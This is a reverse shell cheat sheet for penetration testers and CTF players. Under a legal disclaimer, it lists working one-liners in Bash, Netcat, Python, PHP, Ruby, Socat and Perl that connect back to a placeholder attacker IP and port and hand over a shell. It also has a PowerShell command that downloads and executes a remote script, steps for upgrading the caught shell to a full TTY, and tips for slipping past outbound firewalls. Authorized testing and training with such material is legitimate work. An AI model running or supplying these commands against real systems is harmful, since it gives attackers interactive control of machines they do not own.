# Reverse Shell One-Liners

A quick reference of common reverse shell one-liners used during authorized penetration tests and CTF engagements.

> ⚠️ **Disclaimer:** These commands are for use in authorized penetration testing engagements, CTFs, or your own lab environments only. Running these against systems you do not have explicit written permission to test is illegal.

## Setup

Replace `IP` with your attacker machine's IP address and `PORT` with the port your listener is bound to.

Start a listener first, on the attacker machine:

```bash
nc -lvnp PORT
```

## One-Liners

### Bash

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

### Netcat

```bash
nc -e /bin/sh IP PORT
```

### Python 3

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

### PHP

```bash
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Socat

```bash
socat TCP:IP:PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

### PowerShell

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://IP/shell.ps1')
```

### Perl

```bash
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Upgrading to a Fully Interactive TTY

A raw `nc` shell is a "dumb" shell — no tab-completion, no arrow-key history, `Ctrl+C` kills the whole session instead of the running command, and interactive tools like `vim` or `nano` won't work. Upgrade it to a real TTY in two steps:

**Step 1 — On the target (inside the shell you just caught):**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

This spawns a real pseudo-terminal (PTY) inside the target shell, so it starts behaving like a proper interactive bash session.

**Step 2 — On the attacker machine (your own listener terminal, not the target):**

1. Press `Ctrl+Z`. This suspends the target shell and drops you back to your own local terminal prompt. The target shell isn't killed — it's just paused in the background.
2. In your **local** terminal, run:

   ```bash
   stty raw -echo; fg
   ```

   - `stty raw -echo` puts your local terminal into raw mode, so every keystroke (arrow keys, `Ctrl+C`, etc.) is passed straight through to the shell instead of being handled locally. The terminal will look blank for a moment after you run this — that's expected.
   - `fg` brings the suspended target shell back to the foreground, now with full interactivity.

After this, the shell behaves like a normal local terminal — tab-completion, command history, `Ctrl+C`, and editors like `vim` all work.

**Optional — fix terminal size/type for a cleaner display:**

```bash
export TERM=xterm
stty rows <your_rows> columns <your_columns>
```

Find your local terminal's size with `stty -a` before running this.

## Notes

- If the shell dies immediately, check whether the target's outbound firewall blocks the chosen port — try 443 or 80 instead.
- Some one-liners (PHP, Ruby, Perl) depend on the target having that interpreter installed — check available binaries first.
- Always confirm scope and get written authorization before using any of these against a target.
